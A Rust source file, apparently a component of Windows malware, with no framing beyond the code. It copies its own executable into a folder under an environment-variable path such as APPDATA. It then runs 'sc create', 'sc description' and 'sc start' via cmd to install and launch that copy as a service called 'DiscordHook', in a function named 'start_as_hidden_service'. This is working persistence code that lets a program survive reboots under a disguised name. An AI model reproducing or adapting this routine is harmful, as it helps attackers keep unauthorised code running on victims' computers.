use std::{env, fs, io};
use std::path::{Path, PathBuf};
use std::process::Command;

fn autocopy_to_folder(folder_path: &Path) -> io::Result<PathBuf> {
    let current_exe_path = env::current_exe()?;
    let exe_file_name = current_exe_path
        .file_name()
        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "Invalid executable name"))?;

    let target_file_path = folder_path.join(exe_file_name);

    if !target_file_path.exists() {
        fs::copy(&current_exe_path, &target_file_path)?;
    }

    println!("Successfully copied!");

    Ok(target_file_path)
}

#[cfg(windows)]
pub fn start_as_hidden_service(folder : String, path: String) -> io::Result<()> {
    let startup_folder = env::var(folder)
        .map(|appdata| PathBuf::from(appdata).join(path))
        .unwrap_or_else(|_| PathBuf::from("."));

    let copied_exe_path = autocopy_to_folder(&startup_folder)?;

    let service_name = "DiscordHook";
    let service_display_name = "DiscordHook";

    let cmd = format!("sc create {} binPath= \"\\\"{}\\\" -s\"", service_name, copied_exe_path.to_string_lossy());
    Command::new("cmd")
        .args(&["/C", &cmd])
        .output()?;

    let cmd = format!("sc description {} \"{}\"", service_name, service_display_name);
    Command::new("cmd")
        .args(&["/C", &cmd])
        .output()?;

    let cmd = format!("sc start {}", service_name);
    Command::new("cmd")
        .args(&["/C", &cmd])
        .output()?;

    println!("Service added!");

    Ok(())
}
